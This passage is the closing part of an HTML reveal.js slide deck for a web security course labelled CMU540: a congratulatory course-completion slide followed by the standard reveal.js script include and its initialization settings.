            <!-- Slide 23: Course Completion -->
            <section class="center">
                <h2>Course Completion</h2>
                <div class="timeline-info">
                    <h3>Congratulations!</h3>
                    <ul>
                        <li>All CMU540 sessions completed</li>
                        <li>Comprehensive understanding of web security</li>
                        <li>Hands-on experience with OS³ Studio</li>
                        <li>Industry-standard security practices learned</li>
                        <li>Career pathways explored</li>
                    </ul>
                    <p><strong>Next Steps:</strong> Continue learning, practice with tools, consider certifications</p>
                </div>
            </section>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/reveal.js@4.3.1/dist/reveal.js"></script>
    <script>
        Reveal.initialize({
            hash: true,
            transition: 'slide',
            transitionSpeed: 'default',
            backgroundTransition: 'fade',
            controls: true,
            progress: true,
            center: false,
            touch: true,
            loop: false,
            rtl: false,
            navigationMode: 'default',
            shuffle: false,
            fragments: true,
            fragmentInURL: false,
            embedded: false,
            help: true,
            showNotes: false,
            autoPlayMedia: false,
            preloadIframes: null,
            autoAnimate: true,
            autoAnimateMatcher: null,
            autoAnimateEasing: 'ease',
            autoAnimateDuration: 1.0,
            autoAnimateUnmatched: true,
            autoSlide: 0,
            autoSlideStoppable: true,
            autoSlideMethod: null,
            defaultTiming: null,
            mouseWheel: false,
            previewLinks: false,
            postMessage: true,
            postMessageEvents: false,
            focusBodyOnPageVisibilityChange: true,
            width: '100%',
            height: '100%',
            margin: 0.04,
            minScale: 0.2,
            maxScale: 2.0,
            disableLayout: false
        });
    </script>
</body>

</html>
